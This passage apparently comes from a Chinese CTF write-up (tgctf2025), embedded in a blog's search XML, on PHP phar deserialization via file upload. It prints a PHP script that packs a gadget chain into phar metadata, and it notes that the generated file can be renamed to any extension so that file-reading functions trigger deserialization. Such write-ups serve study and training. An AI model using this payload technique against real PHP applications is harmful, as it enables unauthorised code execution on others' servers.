//添加要压缩的文件$phar->stopBuffering（）；//停止写入文件并完成压缩?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看我的注释就很好明白，把链子当作元数据生成phar压缩文件传入后配合phar来进行反序列化（大概的流程就是这样）</p><p>那么tg的payload也就很好写出，只需要改一下链子</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phpclass yesterday {     public $learn;     public $study;     public $try;}class today {     public $doing;}class future{     }$y = new yesterday();$y-> study = new today();$y->study->doing=new future();@unlink("phar.phar");$phar = new Phar("phar.phar"); //后缀名必须为phar，生成后可以随意修改$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub$phar->setMetadata($y); //将自定义的meta-data存入manifest$phar->addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算$phar->stopBuffering();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接运行，这边报错的话，需要改一下php.ini里的readonly，把ON改成OFF  </p><p><img src="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png"></p><p>第一个红框是文件头，第二个红框是setMetadata，而且如果php文件里有读取文件的函数，他一定会把setMetadata里的内容反序列化。</p><p><img src="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png"></p><p>更改后缀他的文件头是不变的，所以可以修改成任意的后缀（生成之后）</p>]]></content>
      
      
      <categories>
          
          <category> 序列化与反序列化 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> phar+文件上传 </tag>
            
            <tag> tgctf2025 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
